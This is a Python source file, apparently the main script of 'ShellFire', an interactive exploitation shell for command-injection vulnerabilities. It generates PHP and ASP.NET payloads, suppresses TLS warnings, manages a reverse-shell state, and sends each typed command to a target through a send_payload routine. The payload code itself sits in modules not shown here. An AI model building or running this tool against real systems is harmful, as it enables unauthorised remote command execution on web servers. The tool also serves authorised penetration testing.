#!/bin/env python3
# Thanks to Offensive-Security for inspiring this!
# Written by unix-ninja
# Aug 2016

import argparse
import os
import readline
import requests
import shlex
import sys
import time

from shellfire.config import cfg, state
from shellfire.commands import command_list, cmd_config, send_payload, payload_php, payload_aspnet


############################################################
## Version Check

if (sys.version_info < (3, 0)):
  sys.stderr.write("[!] Error! Must execute this script with Python3.")
  sys.exit(2)

############################################################
## Parse options

parser = argparse.ArgumentParser(
    description='An exploitation shell for command injection vulnerabilities.')
parser.add_argument('-c',
                    dest='config',
                    action='store',
                    nargs='?',
                    default=None,
                    const='default',
                    help='load a named config on startup.')
parser.add_argument('-d',
                    dest='debug',
                    action='store_true',
                    help='enable debugging (show queries during execution)')
parser.add_argument('--generate',
                    dest='payload',
                    help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
state.args = parser.parse_args()

############################################################
## Main App


def cli():
  ## if we are generating a payload to stdout, do it now, then bail
  if state.args.payload:
    state.args.payload = state.args.payload.lower()
    if state.args.payload == "php":
      sys.stderr.write("[*] Generating PHP payload...\n")
      payload_php()
    elif state.args.payload == "aspnet":
      sys.stderr.write("[*] Generating ASP.NET payload...\n")
      payload_aspnet()
    else:
      sys.stderr.write("[*] Invalid payload!\n")
    sys.stdout.write(cfg.payload)
    sys.exit(1)

  ## show our banner
  sys.stdout.write(""" (
)\\ )    )       (   (   (
(()/( ( /(    (  )\\  )\\  )\\ )  (   (      (
/(_)))\\())  ))\\((_)((_)(()/(  )\\  )(    ))\\
(_)) ((_)\\  /((_)_   _   /(_))((_)(()\\  /((_)
/ __|| |(_)(_)) | | | | (_) _| (_) ((_)(_))
\\__ \\| ' \\ / -_)| | | |  |  _| | || '_|/ -_)
|___/|_||_|\\___||_| |_|  |_|   |_||_|  \\___|
""")
  sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
  sys.stdout.write("[*] Type '.help' to see available commands\n")
  if state.args.debug is True:
    sys.stdout.write("[*] Debug mode enabled.\n")

  requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

  ## if we specified to load a named config, do it now
  if state.args.config:
    cmd_config([".config", "load", state.args.config])

  ## setup history
  if os.path.isfile(cfg.history_file):
    try:
      readline.read_history_file(cfg.history_file)
    except Exception:
      pass

  ## set initial payload for PHP
  payload_php()

  ## main loop
  while True:
    while state.revshell_running:
      try:
        time.sleep(0.1)
      except Exception:
        state.revshell_running = False
    ## reset command execution state each loop
    state.exec_cmd = True
    ## prompt for input
    try:
      state.userinput = input('>> ').strip()
    except EOFError:
      ## if we recieve EOF, gracefully exit
      sys.stdout.write("\n")
      sys.exit(2)
    if not state.userinput:
      continue
    ## parse our input
    cmd = shlex.split(state.userinput)

    if cmd[0][0] == '.':
      if cmd[0][1:] in command_list.keys():
        state.exec_cmd = False
        try:
          command_list[cmd[0][1:]]['func'](cmd)
        except Exception as e:
          sys.stdout.write("[!] %s\n" % (repr(e)))

    send_payload()


## Main entrypoint - let's not pollute the global scope here.
if __name__ == "__main__":
  cli()
